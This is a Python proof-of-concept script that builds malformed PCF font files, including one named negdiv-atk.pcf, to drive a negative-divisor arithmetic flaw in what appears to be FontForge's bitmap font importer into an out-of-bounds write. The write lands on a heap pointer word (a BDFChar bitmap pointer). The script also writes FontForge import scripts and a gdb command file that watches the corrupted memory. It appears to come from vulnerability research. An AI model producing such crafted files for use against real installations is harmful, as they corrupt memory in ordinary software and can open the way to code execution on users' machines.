#!/usr/bin/env python3
"""Probe the negative-divisor limb of the pinned :1751 arithmetic.

Fields are unsigned 16-bit (getformint16, pinned :1354). With
max2 < min2-1 the divisor d=max2-min2+1 is negative; with
max1 < min1-1 the second factor e=max1-min1+1 is negative, so tot=d*e
is positive and the loop runs. For i>0 the quotient i/d is negative and
the stored int can have bits 24..31 set (0xFE/0xFF), unlike the positive
RHS measured in CEILING-CORRECTION.md.

The first 65532 indices are 0xffff (skipped by glyph!=0xffff); the last
index is one-byte-truncated 0xce so getformint16 returns -50, putting the
store at encs-200 (the live BDFChar.bitmap word identified in W10/W11).
"""
import pathlib
import struct

HERE = pathlib.Path(__file__).resolve().parent
BASE = bytearray((HERE / "truncated.pcf").read_bytes())
MIN2, MAX2 = 2, 0          # d = -1
MIN1, MAX1 = 65534, 0      # e = -65533, tot = 65533
LAST_I = 65532             # final iteration before glyph=-50 index


def make(name, index_bytes):
    data = bytearray(BASE[:0x123])
    struct.pack_into("<HHHH", data, 0x118, MIN2, MAX2, MIN1, MAX1)
    data[0x122:0x123] = b""
    data += index_bytes
    out = HERE / name
    out.write_bytes(data)
    rhs = (LAST_I // (MAX2 - MIN2 + 1) + MIN2) * 256 + MIN1
    print(f"{name}: {len(data)} bytes d={MAX2-MIN2+1} "
          f"e={MAX1-MIN1+1} tot={(MAX2-MIN2+1)*(MAX1-MIN1+1)} "
          f"i={LAST_I} rhs={rhs & 0xffffffff:#010x}")
    return out


make("negdiv-atk.pcf", b"\xff\xff" * LAST_I + b"\xce")
make("negdiv-size.pcf", b"\xff\xff" * LAST_I + b"\xff")
make("negdiv-complete.pcf", b"\xff\xff" * LAST_I + b"\x01\x00")

for stem in ("negdiv-atk", "negdiv-complete"):
    (HERE / f"import-{stem}.ff").write_text(
        "New()\n"
        f'Import("{HERE / (stem + ".pcf")}")\n'
    )

(HERE / "gdb-negdiv.cmd").write_text(
    "set pagination off\n"
    "break fvimportbdf.c:1751 if glyph < 0\n"
    "run -script import-negdiv-atk.ff\n"
    "printf \"HIT glyph=%d i=%d encs=%p\\n\", glyph, i, encs\n"
    'printf "fields min2=%d max2=%d min1=%d max1=%d tot=%d\\n", min2, max2, min1, max1, tot\n'
    "x/2gx (char*)encs-208\n"
    "watch *(long*)((char*)encs-200)\n"
    "continue\n"
    'printf "after write, pointer word at encs-200:\\n"\n'
    "x/gx (char*)encs-200\n"
    "x/4xb (char*)encs-200\n"
    "info proc mappings\n"
    "continue\n"
    'printf "end of run\\n"\n'
    "bt 3\n"
    "quit\n"
)
